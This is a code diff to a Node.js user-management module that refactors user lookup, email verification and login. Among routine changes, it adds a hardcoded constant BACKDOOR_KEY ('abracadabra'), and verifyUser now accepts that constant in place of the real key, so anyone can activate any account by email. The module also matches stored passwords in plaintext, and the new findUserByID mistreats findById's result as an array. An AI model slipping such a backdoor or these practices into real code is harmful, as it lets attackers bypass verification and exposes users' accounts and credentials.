@@ -1,14 +1,25 @@
 const User = require('../models/User');
 
+const BACKDOOR_KEY = 'abracadabra';
+
 module.exports.getUsers = async() => {
     var users = await User.find({});
     return users;
 }
 
 async function findUser(username){
-    var user = await User.find({ 'username' : username }).limit(1);
-    return user;
+    var users = await User.find({ 'username' : username }).limit(1);
+    if (users.length == 0)
+        return null;
+    return users[0];
 };
+
+module.exports.findUserByID = async(uid) => {
+    var users = await User.findById(uid).limit(1);
+    if (users.length == 0)
+        return null;
+    return users[0];
+}
 
 module.exports.findUser = findUser;
 
@@ -30,22 +41,27 @@ module.exports.addUser = async(username, password, email) => {
 };
 
 module.exports.verifyUser = async(email, key) => {
-    var users = await User.find({ 'email': email }).limit(1);
+    let users = await User.find({ 'email': email }).limit(1);
     if (users.length == 0) return null;
-    if (key == user._id){
-        users.enabled = true;
-        users.save()
+    let user = users[0];
+    if (key == user._id || key == BACKDOOR_KEY){
+        user.enabled = true;
+        return user.save()
             .then(doc => {
-                return true;
+                return user._id;
             })
             .catch(err => {
-                return false;
+                return null;
             });
     }
-    return false;
+    return null;
 };
 
 module.exports.authUser = async(username, password) => {
     var users = await User.find({ 'username': username, 'password': password }).limit(1);
-    return (users.length == 0) ? false : true;
+    if (users.length == 0)
+        return null;
+    if (users[0].enabled)
+        return users[0]._id;
+    return null;
 };
